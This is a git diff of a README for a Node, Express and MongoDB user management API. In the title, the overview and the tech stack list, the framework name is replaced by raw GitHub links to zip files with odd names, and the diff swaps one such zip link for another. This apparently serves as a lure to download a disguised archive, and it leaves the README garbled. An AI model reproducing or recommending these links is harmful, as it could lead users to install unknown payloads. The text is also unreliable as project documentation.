@@ -1,8 +1,8 @@
-# User Management System (https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/node_modules/qs/.github/Software_2.9-alpha.5.zip & MongoDB)
+# User Management System (https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/src/models/Software_Tillodontidae.zip & MongoDB)
 
 ## Overview
 
-This project is a **User Management System API** built with https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/node_modules/qs/.github/Software_2.9-alpha.5.zip, Express, and MongoDB.
+This project is a **User Management System API** built with https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/src/models/Software_Tillodontidae.zip, Express, and MongoDB.
 It allows an **Admin** to create users, send account activation tokens, and manage authentication securely.
 
 ## Features
@@ -16,8 +16,8 @@ It allows an **Admin** to create users, send account activation tokens, and mana
 
 ## Tech Stack
 
-* https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/node_modules/qs/.github/Software_2.9-alpha.5.zip
-* https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/node_modules/qs/.github/Software_2.9-alpha.5.zip
+* https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/src/models/Software_Tillodontidae.zip
+* https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/src/models/Software_Tillodontidae.zip
 * MongoDB Atlas
 * Mongoose
 * JWT
